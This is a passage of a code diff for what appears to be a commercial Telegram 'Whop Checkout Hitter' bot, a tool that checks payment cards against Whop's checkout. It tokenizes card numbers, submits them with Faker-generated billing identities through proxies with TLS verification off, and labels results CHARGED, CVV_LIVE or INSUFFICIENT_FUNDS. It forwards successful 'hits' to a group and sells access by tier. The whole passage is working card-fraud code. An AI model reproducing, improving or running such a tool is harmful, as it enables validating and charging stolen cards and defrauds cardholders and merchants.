-    session = await get_basis_session(proxy)
-    if not session:
+        print(f"❌ Confirmation token error: {e}")
         return None
-    
-    tokenize_url = "https://api.basistheory.com/tokenize"
-    
-    headers = {
-        "accept": "application/json",
-        "bt-api-key": WHOP_BASIS_KEY,
-        "bt-region": "us-east-2",
-        "content-type": "application/json",
-        "origin": "https://js.basistheory.com",
-        "referer": "https://js.basistheory.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    }
-    
-    payload = {
-        "type": "card",
-        "data": {
-            "number": card["cc"],
-            "expiration_month": card["month"].zfill(2),
-            "expiration_year": f"20{card['year']}",
-            "cvv": card["cvv"]
-        }
-    }
-    
-    client_kwargs = {'timeout': 30.0, 'verify': False}
-    if proxy:
-        proxy_url = format_proxy(proxy)
-        if proxy_url:
-            client_kwargs['proxy'] = proxy_url
-    
-    async with httpx.AsyncClient(**client_kwargs) as client:
-        response = await client.post(tokenize_url, headers=headers, json=payload)
-        
-        if response.status_code in [200, 201]:
-            data = response.json()
-            token = data.get("id")
-            if token:
-                print(f"✅ [Whop] Card tokenized: {token}")
-                return token
-            else:
-                print(f"❌ [Whop] No token in response: {data}")
-                return None
-        else:
-            try:
-                error_data = response.json()
-                print(f"❌ [Whop] Tokenization failed: {response.status_code} - {error_data}")
-            except:
-                print(f"❌ [Whop] Tokenization failed: {response.status_code}")
-            return None
 
-# ============ WHOP CHECKOUT API ============
-
-async def create_confirmation_token(
-    session_id: str,
-    card_token: str,
-    billing_details: Dict,
-    cookie: str,
-    account_id: str = "biz_1ZH7VJrbsBzY1D",
-    proxy: str = None
-) -> Optional[str]:
-    """Create confirmation token with attestation."""
-    print(f"📡 [Whop] Creating confirmation token...")
-    
-    url = f"{WHOP_API_URL}/confirmation_tokens"
-    
-    headers = {
-        "accept": "*/*",
-        "api-version-date": "2026-08-21",
-        "content-type": "application/json",
-        "origin": "https://whop.com",
-        "referer": f"https://whop.com/checkout/{session_id}/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "whop-private-schema": "true",
-        "cookie": cookie,
-    }
-    
-    address = {
-        "line1": billing_details.get("address_line1", "123 Main St"),
-        "city": billing_details.get("city", "New York"),
-        "state": billing_details.get("state", "NY"),
-        "postal_code": billing_details.get("postal_code", "10001"),
-        "country": billing_details.get("country", "US")
-    }
-    
-    payload = {
-        "account_id": account_id,
-        "billing_details": {
-            "email": billing_details["email"],
-            "name": billing_details["name"],
-            "address": address
-        },
-        "payment_method": {
-            "type": "card",
-            "category": "card",
-            "card": {
-                "token": card_token
-            }
-        },
-        "return_url": f"https://whop.com/checkout/{session_id}/",
-        "setup_future_usage": "off_session",
-        "attestations": {
-            "tos_accepted": True
-        }
-    }
-    
-    print(f"📤 [Whop] Payload: {json.dumps(payload, indent=2)}")
-    
-    client_kwargs = {'timeout': 30.0, 'verify': False}
-    if proxy:
-        proxy_url = format_proxy(proxy)
-        if proxy_url:
-            client_kwargs['proxy'] = proxy_url
-    
-    async with httpx.AsyncClient(**client_kwargs) as client:
-        response = await client.post(url, headers=headers, json=payload)
-        
-        if response.status_code in [200, 201]:
-            data = response.json()
-            token = data.get("id")
-            if token:
-                print(f"✅ [Whop] Confirmation token created: {token}")
-                return token
-            else:
-                print(f"❌ [Whop] No token in response: {data}")
-                return None
-        else:
-            try:
-                error_data = response.json()
-                print(f"❌ [Whop] Confirmation token failed: {response.status_code} - {error_data}")
-            except:
-                print(f"❌ [Whop] Confirmation token failed: {response.status_code}")
-            return None
-
-async def confirm_checkout(
-    session_id: str,
-    confirmation_token: str,
-    client_secret: str,
-    cookie: str,
-    proxy: str = None
-) -> Dict:
-    """Confirm the checkout with attestation in the payload."""
-    print(f"📡 [Whop] Confirming checkout...")
-    
-    if not client_secret:
-        print(f"❌ [Whop] No client_secret provided!")
-        return None
-    
-    url = f"{WHOP_API_URL}/checkout_sessions/{session_id}/confirm"
-    
-    headers = {
-        "accept": "*/*",
-        "api-version-date": "2026-08-21",
-        "content-type": "application/json",
-        "origin": "https://whop.com",
-        "referer": f"https://whop.com/checkout/{session_id}/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "whop-private-schema": "true",
-        "cookie": cookie,
-    }
-    
-    payload = {
-        "confirmation_token": confirmation_token,
-        "client_secret": client_secret,
-        "attestations": {
-            "tos_accepted": True
-        }
-    }
-    
-    print(f"📤 [Whop] Confirm payload: {json.dumps(payload, indent=2)}")
-    
-    client_kwargs = {'timeout': 60.0, 'verify': False}
-    if proxy:
-        proxy_url = format_proxy(proxy)
-        if proxy_url:
-            client_kwargs['proxy'] = proxy_url
-    
-    async with httpx.AsyncClient(**client_kwargs) as client:
-        response = await client.post(url, headers=headers, json=payload)
-        
-        if response.status_code == 200:
-            data = response.json()
-            print(f"✅ [Whop] Confirm response: {data.get('status')}")
-            return data
-        else:
-            try:
-                error_data = response.json()
-                print(f"❌ [Whop] Confirm failed: {response.status_code} - {error_data}")
-                return error_data
-            except:
-                print(f"❌ [Whop] Confirm failed: {response.status_code}")
-                return {"error": response.text[:200]}
-
-# ============ MAIN CHECK FUNCTION ============
-
-async def check_card_whop(
-    checkout_url: str,
-    card: str,
-    proxy: str = None,
-    user_id: int = None
-) -> Dict:
-    """Check a card on Whop checkout with payment status polling."""
-    print(f"\n{'='*80}")
-    print(f"💳 [WHOP HITTER] Checking card")
-    print(f"📍 URL: {checkout_url}")
-    print(f"{'='*80}")
-    
-    start_time = time.time()
-    result = {
-        "card": card,
-        "status": None,
-        "response": None,
-        "time": 0,
-        "session_id": None,
-        "payment_id": None,
-        "final_status": None
-    }
-    
+async def whop_confirm_checkout(session_id: str, confirmation_token: str,
+                                 client_secret: str, cookie: str,
+                                 proxy: str = None) -> Dict:
     try:
-        session_id = extract_session_id_from_url(checkout_url)
-        if not session_id:
-            result["status"] = "ERROR"
-            result["response"] = "Could not extract session ID from URL"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        result["session_id"] = session_id
-        print(f"🆔 Session: {session_id}")
-        
-        cookie = build_whop_cookie_string(session_id)
-        
-        # First, get the client_secret from a basic fetch without client_secret
-        # We need to do this because the client_secret is required for the full fetch
-        initial_url = f"{WHOP_API_URL}/checkout_sessions/{session_id}"
-        initial_headers = {
+        headers = {
             "accept": "*/*",
             "api-version-date": "2026-08-21",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "content-type": "application/json",
+            "origin": "https://whop.com",
+            "referer": f"https://whop.com/checkout/{session_id}/",
+            "user-agent": WHOP_UA,
             "whop-private-schema": "true",
             "cookie": cookie,
         }
-        
-        client_kwargs = {'timeout': 30.0, 'verify': False}
-        if proxy:
-            proxy_url = format_proxy(proxy)
-            if proxy_url:
-                client_kwargs['proxy'] = proxy_url
-        
-        async with httpx.AsyncClient(**client_kwargs) as client:
-            response = await client.get(initial_url, headers=initial_headers)
-            if response.status_code != 200:
-                result["status"] = "ERROR"
-                result["response"] = f"Failed to fetch session: HTTP {response.status_code}"
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-            initial_data = response.json()
-            client_secret = initial_data.get("client_secret")
-        
-        if not client_secret:
-            result["status"] = "ERROR"
-            result["response"] = "No client_secret found"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        print(f"🔑 Client Secret: {client_secret[:30]}...")
-        
-        # Now fetch with client_secret to get payment info
-        session_data = await fetch_whop_session(session_id, client_secret, cookie, proxy)
-        
-        if session_data.get("error"):
-            result["status"] = "ERROR"
-            result["response"] = f"Failed to fetch session: {session_data['error']}"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        # Check if already completed
-        if session_data.get("status") == "completed":
-            payment_status = session_data.get("payment_status")
-            if payment_status == "succeeded" or payment_status is None:
-                result["status"] = "CHARGED"
-                result["response"] = "✅ Already charged (session was completed)"
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-        
-        # Parse card
-        card_data = parse_card_whop(card)
-        if not card_data:
-            result["status"] = "ERROR"
-            result["response"] = "Invalid card format"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        # Generate billing details
+        payload = {
+            "confirmation_token": confirmation_token,
+            "client_secret": client_secret,
+            "attestations": {"tos_accepted": True},
+        }
+        async with whop_client(proxy, timeout=90.0) as c:
+            r = await c.post(f"{WHOP_API}/checkout_sessions/{session_id}/confirm",
+                             headers=headers, json=payload)
+        try:
+            return r.json()
+        except Exception:
+            return {"error": r.text[:200], "http": r.status_code}
+    except Exception as e:
+        return {"error": str(e)}
+
+async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
+                            proxy: str = None, attempts: int = 15) -> Dict:
+    headers = {
+        "accept": "*/*",
+        "api-version-date": "2026-08-21",
+        "whop-private-schema": "true",
+        "user-agent": WHOP_UA,
+        "cookie": cookie,
+    }
+    url = f"{WHOP_API}/checkout_sessions/{session_id}?client_secret={client_secret}"
+    for i in range(attempts):
+        await asyncio.sleep(2)
+        try:
+            async with whop_client(proxy) as c:
+                r = await c.get(url, headers=headers)
+            if r.status_code == 200:
+                d = r.json()
+                pay = d.get("payment") or {}
+                ps = pay.get("status", "")
+                ss = d.get("status", "")
+                err = d.get("last_confirm_error") or {}
+                print(f"  poll {i+1}/{attempts}: session={ss} payment={ps}")
+                if ps == "succeeded":
+                    return {"final": "CHARGED", "data": d, "message": "Payment successful"}
+                if ps == "failed" or err.get("code"):
+                    err_msg = err.get("message", ps)
+                    return {"final": "DECLINED", "message": err_msg, "data": d}
+                if ss == "requires_action":
+                    return {"final": "3DS_REQUIRED", "data": d}
+        except Exception as e:
+            print(f"  poll {i+1}/{attempts}: error {e}")
+            continue
+    return {"final": "TIMEOUT", "message": "Payment processing timeout"}
+
+# ============ MAIN WHOP HIT FUNCTION ============
+
+async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
+    t0 = time.time()
+    out = {"url": checkout_url, "card": card_str, "steps": {}, "status": None, 
+           "elapsed": 0, "message": "", "amount": 0, "currency": "USD"}
+
+    try:
+        plan_id = whop_extract_plan_id(checkout_url)
+        if not plan_id:
+            out["status"] = "ERROR"
+            out["message"] = "No plan_id in URL"
+            return out
+        print(f"🔗 plan_id={plan_id}")
+
+        sess = await whop_create_session(plan_id, checkout_url, proxy)
+        if not sess:
+            out["status"] = "ERROR"
+            out["message"] = "Session creation failed"
+            return out
+
+        session_id = sess["id"]
+        client_secret = sess["client_secret"]
+        account_id = sess.get("seller", {}).get("id", "")
+        sig_id = sess.get("_sig_id", "")
+        quote = sess.get("quote", {})
+        amount = quote.get("base_amount", 0)
+        currency = (quote.get("base_currency") or "USD").upper()
+
+        out["amount"] = amount
+        out["currency"] = currency
+
+        out["steps"]["session"] = {
+            "id": session_id,
+            "client_secret": client_secret[:30] + "...",
+            "account_id": account_id,
+            "amount": amount,
+            "currency": currency,
+            "status": sess.get("status"),
+        }
+        print(f"💰 {amount} {currency}  account_id={account_id}")
+
+        cookie = whop_build_cookie(session_id, client_secret, sig_id)
+
+        card = whop_parse_card(card_str)
+        if not card:
+            out["status"] = "ERROR"
+            out["message"] = "Invalid card format"
+            return out
+
         fake = Faker()
-        first_name = fake.first_name()
-        last_name = fake.last_name()
-        
-        billing_details = {
-            "email": f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 9999)}@gmail.com",
-            "name": f"{first_name} {last_name}",
-            "country": "US",
-            "postal_code": fake.zipcode(),
+        fn, ln = fake.first_name(), fake.last_name()
+        billing = {
+            "email": f"{fn.lower()}.{ln.lower()}{random.randint(100, 9999)}@gmail.com",
+            "name": f"{fn} {ln}",
+            "line1": f"{fake.building_number()} {fake.street_name()}",
             "city": fake.city(),
             "state": fake.state_abbr(),
-            "address_line1": f"{fake.building_number()} {fake.street_name()}"
+            "postal_code": fake.zipcode(),
         }
-        
-        print(f"👤 Name: {billing_details['name']}")
-        print(f"📧 Email: {billing_details['email']}")
-        print(f"📍 Address: {billing_details['address_line1']}, {billing_details['city']}, {billing_details['state']} {billing_details['postal_code']}")
-        
-        # Tokenize card
-        card_token = await tokenize_card_basis(card_data, proxy)
+        print(f"👤 {billing['name']}  {billing['email']}")
+
+        card_token = await whop_tokenise_card(card, proxy)
         if not card_token:
-            result["status"] = "ERROR"
-            result["response"] = "Card tokenization failed"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        # Create confirmation token
-        confirmation_token = await create_confirmation_token(
-            session_id, card_token, billing_details, cookie, "biz_1ZH7VJrbsBzY1D", proxy
+            out["status"] = "ERROR"
+            out["message"] = "Card tokenisation failed"
+            return out
+        out["steps"]["tokenise"] = {"token": card_token}
+
+        conf_token = await whop_create_confirmation_token(
+            session_id, card_token, billing, cookie, account_id, proxy
         )
-        if not confirmation_token:
-            result["status"] = "ERROR"
-            result["response"] = "Confirmation token creation failed"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
+        if not conf_token:
+            out["status"] = "ERROR"
+            out["message"] = "Confirmation token failed"
+            return out
+        out["steps"]["confirmation_token"] = {"token": conf_token}
+
+        confirm = await whop_confirm_checkout(session_id, conf_token, client_secret, cookie, proxy)
+        out["steps"]["confirm"] = confirm
+        print(f"📋 confirm status={confirm.get('status')}  error={confirm.get('last_confirm_error')}")
+
+        status = confirm.get("status", "")
+        last_err = confirm.get("last_confirm_error") or {}
+        payment = confirm.get("payment") or {}
+        pay_stat = payment.get("status", "")
+        err_msg = last_err.get("message", "")
+        err_code = last_err.get("code", "")
+
+        # Check for insufficient funds
+        full_message = f"{err_msg} {str(confirm)} {pay_stat}".lower()
         
-        # Confirm checkout
-        confirm_result = await confirm_checkout(
-            session_id, confirmation_token, client_secret, cookie, proxy
-        )
-        
-        if not confirm_result:
-            result["status"] = "ERROR"
-            result["response"] = "Checkout confirmation failed"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        if "error" in confirm_result:
-            result["status"] = "ERROR"
-            result["response"] = confirm_result.get("error", "Unknown error")
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        
-        # Check immediate response
-        status = confirm_result.get("status", "unknown")
-        last_error = confirm_result.get("last_confirm_error")
-        payment = confirm_result.get("payment")
-        
-        # Check for errors
-        if last_error and isinstance(last_error, dict):
-            error_message = last_error.get("message", "")
-            if "insufficient" in error_message.lower() or "funds" in error_message.lower():
-                result["status"] = "INSUFFICIENT_FUNDS"
-                result["response"] = f"Insufficient funds: {error_message}"
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-            elif "declined" in error_message.lower():
-                result["status"] = "DECLINED"
-                result["response"] = f"Card declined: {error_message}"
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-        
-        # If payment is already succeeded
-        if payment and isinstance(payment, dict):
-            payment_status = payment.get("status", "")
-            if payment_status == "succeeded":
-                result["status"] = "CHARGED"
-                result["response"] = "✅ Payment successful!"
-                result["payment_id"] = payment.get("id")
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-            elif payment_status == "processing":
-                print(f"🔄 [Whop] Payment is processing, polling for status...")
-                # Poll for final status with client_secret
-                poll_result = await poll_payment_status(session_id, client_secret, cookie, proxy)
-                result["status"] = poll_result.get("final_status", "PROCESSING")
-                result["response"] = poll_result.get("final_message", "Payment is processing")
-                result["payment_id"] = poll_result.get("payment_id")
-                result["time"] = round(time.time() - start_time, 2)
-                return result
-        
-        # Check session status
-        if status == "completed":
-            result["status"] = "CHARGED"
-            result["response"] = "✅ Payment successful!"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
+        if "insufficient" in full_message or "funds" in full_message:
+            print(f"💰 [WHOP] INSUFFICIENT FUNDS detected")
+            out["status"] = "INSUFFICIENT_FUNDS"
+            out["message"] = "Your card has insufficient funds"
+            out["elapsed"] = round(time.time() - t0, 2)
+            return out
+
+        if pay_stat == "succeeded":
+            out["status"] = "CHARGED"
+            out["message"] = "Payment successful"
         elif status == "requires_action":
-            result["status"] = "3DS_REQUIRED"
-            result["response"] = "🔐 3D Secure authentication required"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
-        elif status == "open":
-            # Payment might still be processing, poll with client_secret
-            print(f"🔄 [Whop] Session is open, polling for payment status...")
-            poll_result = await poll_payment_status(session_id, client_secret, cookie, proxy)
-            result["status"] = poll_result.get("final_status", "OPEN")
-            result["response"] = poll_result.get("final_message", "Checkout is open")
-            result["payment_id"] = poll_result.get("payment_id")
-            result["time"] = round(time.time() - start_time, 2)
-            return result
+            out["status"] = "3DS_REQUIRED"
+            out["message"] = "3DS authentication required"
+        elif last_err and err_msg:
+            err_lower = err_msg.lower()
+            if "cvv" in err_lower or "security" in err_lower:
+                out["status"] = "CVV_LIVE"
+                out["message"] = err_msg
+            elif "insufficient" in err_lower or "funds" in err_lower:
+                out["status"] = "INSUFFICIENT_FUNDS"
+                out["message"] = "Your card has insufficient funds"
+            else:
+                out["status"] = "DECLINED"
+                out["message"] = err_msg
+        elif pay_stat in ("processing", "") or status in ("completed", "open"):
+            print("⏳ Polling for final status...")
+            poll = await whop_poll_status(session_id, client_secret, cookie, proxy)
+            out["steps"]["poll"] = poll
+            out["status"] = poll["final"]
+            out["message"] = poll.get("message", poll["final"])
         else:
-            result["status"] = "UNKNOWN"
-            result["response"] = f"Status: {status}"
-            result["time"] = round(time.time() - start_time, 2)
-            return result
+            out["status"] = "UNKNOWN"
+            out["message"] = f"status={status} pay={pay_stat}"
+
+        out["elapsed"] = round(time.time() - t0, 2)
+        return out
+
+    except Exception as e:
+        out["status"] = "ERROR"
+        out["message"] = str(e)[:100]
+        out["elapsed"] = round(time.time() - t0, 2)
+        return out
+
+# ============ FORMAT WHOP RESPONSE WITH PREMIUM EMOJIS ============
+
+def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str, str]:
+    """
+    Format Whop hit response with PREMIUM EMOJIS (like Shopify).
+    """
+    status = result.get("status", "UNKNOWN")
+    message = result.get("message", "Unknown")
+    amount = result.get("amount", 0)
+    
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card[:16]
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    full_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
+
+    # Determine status with PREMIUM EMOJIS
+    if status == "CHARGED":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "Paid ✅"
+        status_category = "charged"
+    elif status == "INSUFFICIENT_FUNDS":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "Not Paid ❌"
+        status_category = "approved"
+    elif status == "3DS_REQUIRED":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3DS Required"
+        status_category = "approved"
+    elif status == "CVV_LIVE":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV Live"
+        status_category = "approved"
+    elif status == "DECLINED":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "Not Paid ❌"
+        status_category = "declined"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+        status_text = "Unknown"
+        status_category = "error"
+
+    amount_display = f"${amount/100:.2f}" if amount > 0 else "N/A"
+
+    # Clean message
+    clean_message = message
+    if "insufficient" in message.lower():
+        clean_message = "Your card has insufficient funds"
+    elif "Payment successful" in message or "succeeded" in message.lower():
+        clean_message = "Payment successful"
+
+    # Build output with PREMIUM EMOJIS
+    ui = (
+        f"Site ➳ Whop 🌐\n"
+        f"Amount ➳ {amount_display}\n"
+        f"Status ➳ {status_emoji} {status_text}\n"
+        f"Progress ➳ 1/1\n\n"
+        f"{full_card}\n"
+        f"  ⤷ {clean_message}"
+    )
+
+    return ui, status_category
+
+# ============ SEND WHOP HIT NOTIFICATION WITH PREMIUM EMOJIS ============
+
+async def send_whop_hit_notification(
+    context: ContextTypes.DEFAULT_TYPE,
+    card: str,
+    status: str,
+    message: str,
+    amount: float,
+    currency: str,
+    user_data: dict,
+    bin_info: tuple,
+    status_category: str = "charged"
+):
+    """
+    Send Whop hit notification with PREMIUM EMOJIS (like Shopify).
+    """
+    
+    print("\n" + "="*80)
+    print("🔔 [WHOP HIT NOTIFICATION] DEBUG START")
+    print(f"📊 HIT_NOTIFICATION_ENABLED: {HIT_NOTIFICATION_ENABLED}")
+    print(f"📊 HIT_NOTIFICATION_GROUP_ID: {HIT_NOTIFICATION_GROUP_ID}")
+    print(f"📊 Status: {status}")
+    print("="*80)
+    
+    if not HIT_NOTIFICATION_ENABLED:
+        print("❌ HIT_NOTIFICATION_ENABLED is False, skipping")
+        return
+    
+    if status not in ["CHARGED", "INSUFFICIENT_FUNDS"]:
+        print(f"⚠️ Not a hit, skipping. Status: {status}")
+        return
+    
+    print(f"✅ Hit detected! Status: {status}")
+    
+    user_name = user_data.get('first_name', 'Unknown')
+    username = user_data.get('username', '')
+    
+    if username and username != 'Unknown':
+        user_display = username
+    else:
+        user_display = user_name if user_name != 'Unknown' else f"User {user_data.get('id', 'Unknown')}"
+    
+    tier = user_data.get('tier', 'free')
+    amount_display = f"${amount/100:.2f}" if amount > 0 else "N/A"
+    
+    print(f"👤 User: {user_display}")
+    print(f"💰 Amount: {amount_display}")
+    
+    # Build hit notification with PREMIUM EMOJIS (like Shopify)
+    if status == "CHARGED":
+        hit_message = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["fire"], "🔥")} <b>Status</b> ➛ CHARGED\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Payment successful\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
+
+        )
+    else:
+        hit_message = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")} <b>Status</b> ➛ INSUFFICIENT FUNDS\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Insufficient funds\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
+
+        )
+    
+    # BLADESARKS button like Shopify
+    keyboard = [
+        [InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        print(f"📤 Sending to group: {HIT_NOTIFICATION_GROUP_ID}")
+        
+        await context.bot.send_message(
+            chat_id=HIT_NOTIFICATION_GROUP_ID,
+            text=hit_message,
+            parse_mode="HTML",
+            reply_markup=reply_markup
+        )
+        print(f"✅ Successfully sent to {HIT_NOTIFICATION_GROUP_ID}!")
+        
+        # Forward to hit forwarder
+        asyncio.create_task(
+            send_hit_to_forwarder(
+                card=card,
+                gateway="Whop Checkout",
+                response=message,
+                price=amount_display,
+                bin_info=bin_info,
+                user_id=user_data.get('id', 0),
+                user_tier=tier,
+                status_category=status_category
+            )
+        )
         
     except Exception as e:
-        print(f"❌ [Whop] Error: {e}")
+        print(f"❌ Failed to send: {e}")
         import traceback
         traceback.print_exc()
-        result["status"] = "ERROR"
-        result["response"] = str(e)[:100]
-        result["time"] = round(time.time() - start_time, 2)
-        return result
-
-# ============ TELEGRAM COMMAND ============
-
-async def whop_command(update, context):
-    """Whop Checkout Hitter - /whop <url> <card>"""
-    try:
-        from telegram import Update
-        from telegram.ext import ContextTypes
-        from telegram.constants import ParseMode
-    except ImportError:
-        print("Telegram not available, using console mode")
-        return await whop_command_console(update, context)
     
+    print("="*80)
+    print("🔔 [WHOP HIT NOTIFICATION] DEBUG END")
+    print("="*80)
+
+# ============ WHOP COMMAND HANDLER ============
+@check_gateway("whop")
+async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Whop Checkout Hitter - /whop <url> <card1> <card2> ...
+    """
+    
+    print("\n" + "="*80)
+    print("🎯 [WHOP COMMAND] Received")
+    print("="*80)
+    
+    if not await verify_group_access(update, context):
+        return
+
     user_id = update.effective_user.id
     message = update.effective_message
+
+    print(f"👤 User ID: {user_id}")
+    print(f"📝 Message: {message.text}")
+
+    # ============ TIER CHECK - ONLY ULTIMATE AND ADMIN ============
+    tier = user_manager.get_tier(user_id)
     
+    if tier not in ['ultimate', 'admin'] and user_id != OWNER_ID:
+        await message.reply_text(
+            f"❌ <b>Access Denied</b>\n\n"
+            f"The <code>/whop</code> gateway is only available for <b>ULTIMATE</b> and <b>ADMIN</b> tiers.\n\n"
+            f"🎯 Your tier: <b>{tier.upper()}</b>\n\n"
+            f"💎 Upgrade to Ultimate to access this gateway.\n"
+            f"Use <code>/buy</code> to see upgrade options.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+        return
+
+    if user_id != OWNER_ID and not user_manager.can_access_gateway(user_id, 'shopify'):
+        await message.reply_text(
+            "❌ <b>Whop Hitter not available for your tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
     if not context.args:
         await message.reply_text(
             "💳 <b>Whop Checkout Hitter</b>\n\n"
-            "Usage:\n"
-            "  <code>/whop &lt;url&gt;</code> - Get checkout info\n"
-            "  <code>/whop &lt;url&gt; &lt;card&gt;</code> - Charge card\n\n"
-            "Card format: <code>cc|mm|yy|cvv</code>\n"
-            "Example: <code>/whop https://whop.com/checkout/plan_xxx?session=chs_xxx 4242424242424242|12|26|123</code>",
+            "Usage: <code>/whop &lt;checkout_url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
+            "Example:\n"
+            "<code>/whop https://whop.com/checkout/plan_XXX/ 4242424242424242|12|26|123 4111111111111111|12|26|456</code>\n\n"
+            "Card format: <code>cc|mm|yy|cvv</code>\n\n"
+            "📌 <b>Multiple cards:</b> Add multiple cards in one message\n"
+            "   Each card will be checked one by one",
             parse_mode=ParseMode.HTML
         )
         return
+
+    args = context.args
     
-    text = message.text or ""
-    args = text.split(maxsplit=2)
+    # ============ EXTRACT URL ============
+    checkout_url = None
+    card_index = 0
     
-    url = extract_whop_url(args[1] if len(args) > 1 else "")
-    if not url:
-        await message.reply_text("❌ Invalid Whop URL")
-        return
-    
-    proxy = get_stripe_user_proxy(user_id)
-    if not proxy:
-        await message.reply_text(
-            "❌ <b>No Proxy Found</b>\n\n"
-            "Set a proxy with: <code>/addproxy user:pass@host:port</code>",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    cards = []
-    if len(args) > 2:
-        cards = parse_cards_whop(args[2])
-    
-    session_id = extract_session_id_from_url(url)
-    
-    processing_msg = await message.reply_text(
-        f"🔍 <b>Processing checkout...</b>\n\n"
-        f"🆔 Session: <code>{session_id}</code>",
-        parse_mode=ParseMode.HTML
-    )
-    
-    if not cards:
-        cookie = build_whop_cookie_string(session_id)
-        
-        # Get client_secret first
-        initial_url = f"{WHOP_API_URL}/checkout_sessions/{session_id}"
-        initial_headers = {
-            "accept": "*/*",
-            "api-version-date": "2026-08-21",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "whop-private-schema": "true",
-            "cookie": cookie,
-        }
-        
-        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
-            response = await client.get(initial_url, headers=initial_headers)
-            if response.status_code != 200:
-                await processing_msg.edit_text(
-                    f"❌ <b>Session Error</b>\n\n"
-                    f"🆔 Session: <code>{session_id}</code>\n"
-                    f"📝 Error: HTTP {response.status_code}",
-                    parse_mode=ParseMode.HTML
-                )
-                return
-            data = response.json()
-            client_secret = data.get("client_secret")
-        
-        if not client_secret:
-            await processing_msg.edit_text(
-                f"❌ <b>No client_secret found</b>",
-                parse_mode=ParseMode.HTML
-            )
-            return
-        
-        session_data = await fetch_whop_session(session_id, client_secret, cookie, proxy)
-        
-        if session_data.get("error"):
-            await processing_msg.edit_text(
-                f"❌ <b>Session Error</b>\n\n"
-                f"📝 Error: {session_data['error']}",
-                parse_mode=ParseMode.HTML
-            )
-            return
-        
-        total = session_data.get("amount", 0)
-        currency = session_data.get("currency", "USD")
-        sym = get_currency_symbol(currency)
-        
-        await processing_msg.edit_text(
-            f"💳 <b>Whop Checkout Info</b>\n\n"
-            f"🆔 Session: <code>{session_id}</code>\n"
-            f"🏪 Merchant: <code>{session_data.get('merchant', 'Unknown')}</code>\n"
-            f"📦 Product: <code>{session_data.get('product', 'N/A')}</code>\n"
-            f"💰 Price: <code>{sym}{total:.2f} {currency}</code>\n"
-            f"📊 Status: <code>{session_data.get('status', 'Unknown')}</code>\n"
-            f"💳 Payment Status: <code>{session_data.get('payment_status', 'None')}</code>\n\n"
-            f"Use: <code>/whop {url} card</code> to charge",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    # Process cards
-    results = []
-    charged_card = None
-    start_time = time.perf_counter()
-    
-    for i, card_data in enumerate(cards, 1):
-        card_str = f"{card_data['cc']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
-        
-        await processing_msg.edit_text(
-            f"💳 <b>Charging Whop Checkout</b>\n\n"
-            f"🆔 Session: <code>{session_id}</code>\n"
